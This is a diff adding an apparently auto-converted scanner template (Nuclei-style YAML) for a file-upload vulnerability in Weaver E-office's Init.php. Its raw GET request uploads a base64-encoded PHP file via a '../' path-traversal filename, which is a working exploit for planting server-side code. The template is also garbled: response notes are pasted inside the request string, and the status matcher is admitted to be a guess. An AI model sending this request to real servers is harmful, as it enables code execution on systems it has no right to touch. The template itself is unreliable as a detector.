@@ -1,0 +1,36 @@
+id: poc-xu8s01a4ni2zpiem
+info:
+  name: 泛微 E-office init.php 文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xu8s01a4ni2zpiem
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xu8s01a4ni2zpiem
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /E-mobile/App/Init.php?m=createDo_Email&upload_file=PD9waHAgZWNobyBtZDUoMjMzKTt1bmxpbmsoX19GSUxFX18pPz4=&file_name=../testa123.php HTTP/1.1
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    ^(?=.*?(?:提交成功|新建成功)).*?$
+
+
+    # 上传文件定位
+
+    /attachment/testa123.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
